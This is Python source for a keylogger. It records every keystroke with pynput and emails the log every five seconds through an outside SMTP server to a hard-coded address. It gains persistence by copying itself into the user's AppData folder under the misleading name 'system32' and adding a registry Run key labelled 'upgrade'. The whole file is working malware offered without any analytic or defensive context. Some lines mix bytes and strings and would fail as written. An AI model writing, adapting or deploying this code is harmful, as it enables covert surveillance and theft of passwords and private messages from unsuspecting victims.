import pynput.keyboard as pynput
import smtplib
import threading
import os
import shutil
import sys
import subprocess

log = """
start
"""


def callback_func(key):
    global log
    try:
        log = log + key.char.encode("utf-8")
    except:
        log = log + str(key)


def send_mail(email, password, to_email, message):
    server = smtplib.SMTP("smtp.live.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, to_email, message)
    server.close()


def thread_func():
    global log
    send_mail("@hotmail.com", "", "@gmail.com", log)
    log = """
    """
    timer = threading.Timer(5, thread_func)
    timer.start()


file_path = os.environ["appdata"] + "\\system32"
if not os.path.exists(file_path):
    shutil.copyfile(sys.executable, file_path)
    regedit = "reg add HKCU\\Software\\Microsoft\\Windows\\Currentversion\\Run /v upgrade /t REG_SZ /d " + file_path
    subprocess.call(regedit, shell=True)

listener = pynput.Listener(on_press=callback_func)

with listener:
    thread_func()
    listener.join()